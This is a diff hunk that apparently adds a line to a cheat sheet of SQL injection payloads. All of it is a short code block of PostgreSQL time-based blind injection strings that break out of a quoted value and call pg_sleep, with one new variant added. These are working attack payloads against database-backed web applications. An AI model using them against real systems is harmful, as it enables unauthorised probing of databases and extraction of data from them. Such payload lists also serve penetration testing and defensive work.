@@ -611,6 +611,7 @@ QUERY-1; QUERY-2
 ```sql
 || SELECT pg_sleep(10)
 ' || (SELECT '' FROM pg_sleep(5)) || '
+'|| (SELECT+pg_sleep(10)::text)||'
 ', (SELECT 'blabla' FROM pg_sleep(5))--
 ```
 
